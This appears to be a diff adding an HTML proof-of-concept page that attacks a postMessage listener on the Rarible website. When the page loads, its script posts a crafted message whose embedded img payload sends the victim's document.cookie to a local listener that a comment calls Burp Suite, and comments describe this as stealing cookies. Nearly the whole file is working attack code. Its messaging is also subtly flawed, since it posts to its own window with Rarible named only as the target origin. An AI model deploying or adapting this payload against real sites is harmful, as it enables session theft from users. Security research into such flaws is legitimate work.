@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Payload in Action</h1>
+    <p>This page sends a malicious payload to the target website (Rarible).</p>
+
+    <script>
+        // When the malicious page loads, send the crafted postMessage to Rarible
+        window.onload = function() {
+            // Define the malicious message that will trigger the vulnerable Rarible listener
+            const maliciousMessage = {
+                event: "malicious_payload",  // This is the data that Rarible's event listener will match against
+                payload: "<img src='http://127.0.0.1:8081/log?cookie=" + document.cookie + "' />"  // Steal cookies by sending them to Burp Suite listener
+            };
+
+            // Send the malicious postMessage to the Rarible page
+            window.postMessage(maliciousMessage, "https://rarible.com");  // Target Rarible's origin
+        };
+    </script>
+</body>
+</html>
